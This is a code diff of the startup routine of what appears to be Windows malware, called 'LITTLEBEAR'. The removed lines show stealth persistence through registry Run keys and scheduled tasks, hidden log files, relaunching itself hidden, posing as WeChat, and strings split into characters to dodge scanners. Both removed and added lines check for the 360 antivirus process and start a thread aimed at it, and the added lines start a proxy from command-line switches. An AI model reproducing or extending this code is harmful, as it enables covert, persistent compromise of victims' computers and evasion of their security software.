@@ -18,7 +18,7 @@
 #include "log.h"
 #include "bootHelper.h"
 #include "public.h"
-
+#include "Parameter.h"
 #include <iostream>
 
 using namespace std;
@@ -48,311 +48,41 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 	int iRet = 0;
 	char szShowInfo[1024];
 
-	//	char szPeSuffixExe[] = {'e','x','e',0};
-	//	char szPeSuffixCom[] = {'c','o','m',0};
-	//	char szPeSuffixScr [] = {'s','c','r',0};
-	//	char szPeSuffixBat [] = {'b','a','t',0};
-	// 	char szPeSuffixBin[] = {'b','i','n',0};
-	// 	char szPeSuffixCpl[] = {'c','p','l',0};
-	// 	char szPeSuffixAcm[] = {'a','c','m',0};
-	// 	char szPeSuffixMsi[] = {'m','s','i',0};
-	// 	char szPeSuffixDrv[] = {'d','r','v',0};
-	// 	char szPeSuffixSys[] = {'s','y','s',0};
-	// 	char szPeSuffixDll[] = {'d','l','l',0};
-	// 	char szPeSuffixLnk [] = {'l','n','k',0};
-	//	char * szPeSuffix = szPeSuffixExe;
-
-	char szCurrentPath[MAX_PATH] = { 0 };
-	char szCurrentExePath[MAX_PATH] = { 0 };
-	iRet = lpGetModuleFileNameA(0, szCurrentExePath, MAX_PATH);
-
-	iRet = GetPathFromFullName(szCurrentExePath, szCurrentPath);//GetModuleBaseName	返回进程名不包含路径
-
-	char szExeName[MAX_PATH] = { 0 };
-	iRet = GetNameFromFullName(szCurrentExePath, szExeName);
-
-	lpwsprintfA(strPEResidence, "%s%s", strDataPath, szExeName);
-
-	char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
-	int b360Running = GetProcessIdByName(sz360Tray);
-
 	int iArgc = 0;
 	wchar_t** lpArgvW = lpCommandLineToArgvW(lpGetCommandLineW(), &iArgc);
-	if ((iArgc >= 2))
+	if (iArgc >= 2)
 	{
-		char szParam[MAX_PATH] = { 0 };
-		iRet = lpWideCharToMultiByte(CP_ACP, 0, lpArgvW[1], -1, szParam, MAX_PATH, NULL, NULL);
-		if (iArgc >= 3)
-		{
-			char szParam2[MAX_PATH] = { 0 };
-			iRet = lpWideCharToMultiByte(CP_ACP, 0, lpArgvW[2], -1, szParam2, MAX_PATH, NULL, NULL);
-			lplstrcpyA(szParentProcName, szParam2);
-		}
+		for (int i = 1; i < iArgc; i++) {
+			char szParam[MAX_PATH] = { 0 };
+			iRet = lpWideCharToMultiByte(CP_ACP, 0, lpArgvW[i], -1, szParam, MAX_PATH, NULL, NULL);
 
-		if (lplstrcmpiA(szParam, "MyComputer") == 0)
-		{
-			OpenMyComputer();
-			writeLog("MyComputer startup\r\n");
-		}
-		else if (lplstrcmpiA(szParam, "Recycle") == 0) {
-			OpenRecycle();
-			writeLog("Recycle startup\r\n");
-		}
-		else if (lplstrcmpiA(szParam, "IE") == 0)
-		{
-			char szIEFilePath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','I','n','t','e','r','n','e','t',' ',
-				'E','x','p','l','o','r','e','r','\\','i','e','x','p','l','o','r','e','.','e','x','e',0 };
-			lplstrcpyA(szIEPath, szIEFilePath);
-			szIEPath[0] = szSysDir[0];
-			char szShellExxcuteAActionOpen[] = { 'o','p','e','n',0 };
-			lpShellExecuteA(0, szShellExxcuteAActionOpen, szIEPath, 0, 0, SW_SHOWNORMAL);
+			if (lplstrcmpiA(szParam, "-p") == 0) {
+				char szParam2[MAX_PATH] = { 0 };
+				iRet = lpWideCharToMultiByte(CP_ACP, 0, lpArgvW[i+1], -1, szParam2, MAX_PATH, NULL, NULL);
 
-			writeLog("IE startup\r\n");
-		}
-		else if (lplstrcmpiA(szParam, "QQ") == 0)
-		{
-			if ((*strQQPath == 0))
-			{
-				iRet = GetApplicationInfo(TRUE);
+				iRet = AppProxyStart(szParam2);
+				break;
 			}
-
-			char szQQPath[MAX_PATH];
-			lplstrcpyA(szQQPath, strQQPath);
-			char szQQSubPath[] = { '\\','B','i','n','\\','Q','Q','S','c','L','a','u','n','c','h','e','r','.','e','x','e',0 };
-			lplstrcatA(szQQPath, szQQSubPath);
-			char szQQDstPath[MAX_PATH];
-			lpwsprintfA(szQQDstPath, "\"%s\"", szQQPath);
-			iRet = lpWinExec(szQQDstPath, SW_SHOWNORMAL);
-
-			writeLog("QQ startup\r\n");
-		}
-		else if (lplstrcmpiA(szParam, "wechat") == 0)
-		{
-			if (*szWechatPath == 0)
+			else if (lplstrcmpiA(szParam, "-f") == 0)
 			{
-				iRet = GetApplicationInfo(TRUE);
+				iRet = ReleaseFirstStart();
+				break;
 			}
-
-			char szWechatTmpPath[MAX_PATH];
-			lplstrcpyA(szWechatTmpPath, szWechatPath);
-			char szWechatSubPath[] = { '\\','w','e','c','h','a','t','.','e','x','e',0 };
-			lplstrcatA(szWechatTmpPath, szWechatSubPath);
-			char szWechatDstPath[MAX_PATH];
-			lpwsprintfA(szWechatDstPath, "\"%s\" --type=gpu-process", szWechatTmpPath);
-			iRet = lpWinExec(szWechatDstPath, SW_SHOWNORMAL);
-
-			writeLog("wechat startup\r\n");
-		}
-		else if (lplstrcmpiA(szParam, "FIREFOX") == 0)
-		{
-			if (*szFireFoxPath == FALSE)
-			{
-				iRet = GetApplicationInfo(TRUE);
-			}
-
-			char sztmppath[MAX_PATH];
-			lplstrcpyA(sztmppath, szFireFoxPath);
-			char szfirefox[] = { '\\','f','i','r','e','f','o','x','.','e','x','e',0 };
-			lplstrcatA(sztmppath, szfirefox);
-			char szFireFoxDstPath[MAX_PATH];
-			lpwsprintfA(szFireFoxDstPath, "\"%s\"", sztmppath);
-			iRet = lpWinExec(szFireFoxDstPath, SW_SHOWNORMAL);
-
-			writeLog("firfox startup\r\n");
-		}
-		else if (lplstrcmpiA(szParam, "CHROME") == 0)
-		{
-			if (*szChromePath == FALSE)
-			{
-				iRet = GetApplicationInfo(TRUE);
-			}
-
-			char sztmppath[MAX_PATH];
-			lplstrcpyA(sztmppath, szChromePath);
-			char szchrome[] = { '\\','c','h','r','o','m','e','.','e','x','e',0 };
-			lplstrcatA(sztmppath, szchrome);
-			char szChromeDstPath[MAX_PATH];
-			lpwsprintfA(szChromeDstPath, "\"%s\"", sztmppath);
-			iRet = lpWinExec(szChromeDstPath, SW_SHOWNORMAL);
-
-			writeLog("chrome startup\r\n");
-		}
-
-		else if (lplstrcmpiA(szParam, "STARTFIRSTTIME") == 0 || lplstrcmpiA(szParam, "install") == 0)
-		{
-			iRet = ReleaseIcon(strDataPath, lpThisDll);
-
-			char strLogFilePath[MAX_PATH] = { 0 };
-			iRet = makeFullFileName(strLogFilePath, LITTLEBEAR_LOG_FILE_NAME);
-			iRet = lpSetFileAttributesA(strLogFilePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);
-
-			if (lplstrcmpiA(szCurrentPath, strDataPath) != 0)
-			{
-				char szDllName[MAX_DLL_COUNT][MAX_PATH] = { 0 };
-				DWORD iDllCnt = 0;
-				iRet = backHome(strDataPath, szCurrentPath, szDllName, &iDllCnt);
-			}
-
-			if (b360Running)
-			{
-				int iRet = GetApplicationInfo(TRUE);
-				iRet = lnkDesktop(strPEResidence, szSysDir, strUserName, strDataPath);
-
-				writeLog("360 is running so to create icon on desktop\r\n");
-			}
-			else
-			{
-				if (iSystemVersion <= SYSTEM_VERSION_XP)
-				{
-					iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
-					iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
-					if (iRet == 0)
-					{
-						writeLog(" windows xp SetBootForRegRun error\r\n");
-					}
-					else
-					{
-						writeLog("  windows xp SetBootForRegRun ok\r\n");
-					}
-
-					/*
-					iRet = BackupProgram(strPEResidence, szDllName, iDllCnt, szSysDir, strUserName, strBakPEResidence);
-					if (iRet == 0)
-					{
-						writeLog("BootAutoRun windows xp BackupProgram error\r\n");
-					}
-					else
-					{
-						writeLog("BootAutoRun BackupProgram ok\r\n");
-					}*/
-				}
-				else
-				{
-					int iRet = createBootTask(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, "", iSystemVersion);
-					iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
-					iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
-				}
-			}
-
-			writeLog("Run first time for network download\r\n");
-		}
-		else {
-			lpwsprintfA(szShowInfo, "unrecognized startup param:%s\r\n", szParam);
-			writeLog(szShowInfo);
-		}
-	}
-	//double click the program on desktop
-	else if (lplstrcmpiA(szCurrentPath, strDataPath) != 0)
-	{
-		char szwechat[] = { 'W','e','C','h','a','t','.','e','x','e',0 };
-		char szexplorer[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
-		char szParentProcName[MAX_PATH];
-		iRet = GetParentProcName(szParentProcName);
-		//MessageBoxA(0, szParentProcName, szParentProcName, MB_OK);
-		if ((szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0) && lstrcmpiA(szwechat, szExeName) != 0)
-		{
-			char strShowFileName[MAX_PATH] = { 0 };
-			char* pShowFileName = GetLinkDocFileName(strShowFileName, szCurrentPath);
-			if (pShowFileName)
-			{
-				char szShowContentCmd[MAX_PATH] = { 0 };
-				lpwsprintfA(szShowContentCmd, "\"%s\"", strShowFileName);
-				char szOpen[] = { 'o','p','e','n',0 };
-				HINSTANCE hInst = lpShellExecuteA(0, szOpen, szShowContentCmd, 0, strDataPath, SW_NORMAL);
-			}
-		}
-
-		char szDllName[MAX_DLL_COUNT][MAX_PATH] = { 0 };
-		DWORD iDllCnt = 0;
-		iRet = backHome(strDataPath, szCurrentPath, szDllName, &iDllCnt);
-		iRet = ReleaseIcon(strDataPath, lpThisDll);
-
-		char strLogFilePath[MAX_PATH] = { 0 };
-		iRet = makeFullFileName(strLogFilePath, LITTLEBEAR_LOG_FILE_NAME);
-		iRet = lpSetFileAttributesA(strLogFilePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);
-
-		if (b360Running)
-		{
-			iRet = GetApplicationInfo(TRUE);
-			iRet = lnkDesktop(strPEResidence, szSysDir, strUserName, strDataPath);
-
-			writeLog("360 is running so to create icon on desktop\r\n");
-		}
-		else
-		{
-			if (iSystemVersion <= SYSTEM_VERSION_XP)
-			{
-				iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
-				iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
-				if (iRet == 0)
-				{
-					writeLog(" windows xp SetBootForRegRun error\r\n");
-				}
-				else
-				{
-					writeLog("  windows xp SetBootForRegRun ok\r\n");
-				}
-
-				/*
-				iRet = BackupProgram(strPEResidence, szDllName, iDllCnt, szSysDir, strUserName, strBakPEResidence);
-				if (iRet == 0)
-				{
-					writeLog("BootAutoRun windows xp BackupProgram error\r\n");
-				}
-				else
-				{
-					writeLog("BootAutoRun BackupProgram ok\r\n");
-				}*/
-			}
-			else
-			{
-				iRet = createBootTask(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, "", iSystemVersion);
-				iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
-				iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
-			}
-		}
-
-		if (szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0)
-		{
-			if (lstrcmpiA(szwechat, szExeName) == 0)
-			{
-				char wechatcmd[MAX_PATH] = { 0 };
-				lpwsprintfA(wechatcmd, "\"%s%s\"", szCurrentExePath, "wechatorg.exe");
-				//char szopen[] = { 'o','p','e','n',0 };
-				//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
-				iRet = lpWinExec(wechatcmd, SW_HIDE);
+			else if (lplstrcmpiA(szParam, "-s") == 0) {
+				break;
 			}
 			else {
-				if (gMutex)
-				{
-					lpReleaseMutex(gMutex);
-					lpCloseHandle(gMutex);
-				}
-				char szCmd[MAX_PATH] = { 0 };
-				lpwsprintfA(szCmd, "\"%s\"", strPEResidence);
-				//char szopen[] = { 'o','p','e','n',0 };
-				//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
-				iRet = lpWinExec(szCmd, SW_HIDE);
-
-				lpwsprintfA(szShowInfo, "explorer.exe start program at first, now to restart program:%s at second for the sake of hide\r\n", strPEResidence);
-				writeLog(szShowInfo);
-
-				lpExitProcess(0);
-				return FALSE;
+				ExitProcess(0);
 			}
 		}
 	}
 	else {
-		log("parent:%s\r\n", szParentProcName);
+		iRet = ExplorerFirstStart();
 	}
 
 	BOOL exist = FALSE;
 	gMutex = CheckInstanceExist(&exist);
-	if (gMutex == 0)
-	{
-		ExitProcess(0);
-	}
-	else if (gMutex && exist)
+	if (gMutex == 0 || (gMutex && exist))
 	{
 		lpReleaseMutex(gMutex);
 
@@ -374,6 +104,8 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 		writeLog(szShowInfo);
 	}
 
+	char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
+	int b360Running = GetProcessIdByName(sz360Tray);
 	if (b360Running)
 	{
 		HANDLE hThreadLnkProc = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)snoop360snooze, 0, 0, 0);
